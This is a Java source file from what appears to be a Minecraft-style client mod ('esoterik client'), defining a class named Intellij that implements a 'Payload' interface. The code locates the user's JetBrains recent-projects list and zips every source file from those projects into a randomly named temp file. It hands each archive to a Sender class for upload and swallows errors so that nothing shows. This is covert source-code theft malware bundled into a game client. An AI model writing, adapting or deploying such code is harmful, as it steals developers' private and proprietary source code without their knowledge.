package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.FileUtil;
import com.esoterik.client.util.Payload;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Scanner;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class Intellij implements Payload {
   public void execute() throws Exception {
      String workspaces = this.getIntellijWorkspaces();

      assert workspaces != null;

      Arrays.stream(workspaces.split("\n")).forEach((s) -> {
         try {
            File file = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
            this.pack(s, file.getPath());
            Sender.send(file);
         } catch (Exception var3) {
         }

      });
   }

   private void pack(String sourceDirPath, String zipFilePath) throws IOException {
      Path p = Files.createFile(Paths.get(zipFilePath));
      ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p));
      Throwable var5 = null;

      try {
         Path pp = Paths.get(sourceDirPath);
         Files.walk(pp).filter((path) -> {
            return !Files.isDirectory(path, new LinkOption[0]);
         }).filter((path) -> {
            return path.toFile().getPath().contains("src");
         }).forEach((path) -> {
            ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());

            try {
               zs.putNextEntry(zipEntry);
               Files.copy(path, zs);
               zs.closeEntry();
            } catch (IOException var5) {
            }

         });
      } catch (Throwable var14) {
         var5 = var14;
         throw var14;
      } finally {
         if (zs != null) {
            if (var5 != null) {
               try {
                  zs.close();
               } catch (Throwable var13) {
                  var5.addSuppressed(var13);
               }
            } else {
               zs.close();
            }
         }

      }

   }

   private String getIntellijWorkspaces() {
      try {
         File folder = new File(System.getProperty("user.home") + "/AppData/Roaming/JetBrains/");
         if (!folder.exists()) {
            return null;
         } else {
            StringBuilder sb = new StringBuilder();
            File[] var2 = folder.listFiles();

            assert var2 != null;

            File[] var4 = var2;
            int var5 = var2.length;

            for(int var6 = 0; var6 < var5; ++var6) {
               File folders = var4[var6];
               if (folders != null && folders.isDirectory()) {
                  File file = new File(folders.getAbsolutePath() + "/options/recentProjects.xml");
                  if (file.exists()) {
                     Scanner scanner = new Scanner(file, "UTF-8");
                     boolean log = false;

                     while(scanner.hasNextLine()) {
                        String line = scanner.nextLine();
                        if (log) {
                           if (line.contains("</list>")) {
                              log = false;
                           } else if (!line.contains("<list>")) {
                              line = line.substring(line.indexOf("\"") + 1);
                              line = line.substring(0, line.lastIndexOf("/>") - 2);
                              sb.append(line);

                              try {
                                 File file1 = new File(line);
                                 if (file1.exists()) {
                                    String size = file1.isDirectory() ? this.getFolderSize(file1) : this.getFileSize(file1);
                                    if (size != null) {
                                       sb.append(" ");
                                       sb.append(size);
                                    }
                                 }
                              } catch (Exception var14) {
                              }

                              sb.append("\n");
                           }
                        } else if (line.contains("<option name=\"recentPaths\">")) {
                           log = true;
                        }
                     }

                     scanner.close();
                  }
               }
            }

            return sb.toString().replace("$USER_HOME$", System.getProperty("user.home")).replace("/", "\\");
         }
      } catch (Exception var15) {
         return null;
      }
   }

   private String getFileSize(File file) {
      long bytes = file.length();
      long kilobytes = bytes / 1024L;
      long megabytes = kilobytes / 1024L;
      if (megabytes > 0L) {
         return String.format("%,d MB", megabytes);
      } else {
         return kilobytes > 0L ? String.format("%,d KB", kilobytes) : String.format("%,d B", bytes);
      }
   }

   private long getFolderSizeData(File f) {
      long ret = 0L;
      File[] var3 = f.listFiles();

      assert var3 != null;

      File[] var5 = var3;
      int var6 = var3.length;

      for(int var7 = 0; var7 < var6; ++var7) {
         File file = var5[var7];
         if (file != null) {
            if (file.isDirectory()) {
               ret += this.getFolderSizeData(file);
            } else {
               ret += file.length();
            }
         }
      }

      return ret;
   }

   private String getFolderSize(File folder) {
      try {
         if (folder != null && folder.isDirectory()) {
            long bytes = this.getFolderSizeData(folder);
            long kilobytes = bytes / 1024L;
            long megabytes = kilobytes / 1024L;
            if (megabytes > 0L) {
               return String.format("%,d MB", megabytes);
            } else {
               return kilobytes > 0L ? String.format("%,d KB", kilobytes) : String.format("%,d B", bytes);
            }
         } else {
            return null;
         }
      } catch (Exception var8) {
         return null;
      }
   }
}
